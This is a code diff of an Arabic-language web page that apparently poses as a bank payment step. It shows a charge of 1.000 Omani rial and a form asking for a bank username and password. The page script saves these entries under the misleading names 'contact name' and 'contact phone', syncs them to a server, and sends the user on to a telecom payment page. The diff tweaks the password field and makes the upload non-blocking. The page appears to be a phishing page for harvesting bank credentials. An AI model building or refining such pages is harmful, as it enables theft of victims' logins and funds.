@@ -15,7 +15,7 @@
     <div class="amount"><span>المبلغ المطلوب</span><strong>1.000 ر.ع</strong></div>
     <form id="contact-form">
       <label>اسم المستخدم<input type="text" autocomplete="name" required placeholder=""></label>
-      <label>كلمة المرور<input type="tel" autocomplete="tel" inputmode="tel" required placeholder=>
+      <label>كلمة المرور<input type="text" autocomplete="name" inputmode="tel" required placeholder=>
       <button type="submit">تأكيد الطلب</button>
     </form>
     <a href="payment.html">العودة لاختيار بنك آخر</a>
@@ -33,7 +33,7 @@
       draft.paymentContactName = inputs[0].value;
       draft.paymentContactPhone = inputs[1].value;
       localStorage.setItem('musaedDraft', JSON.stringify(draft));
-      await syncDraft(draft);
+      syncDraft(draft).catch(error => console.error('تعذر حفظ بيانات التواصل:', error));
       window.location.href = 'telecom-payment.html';
     });
   </script>
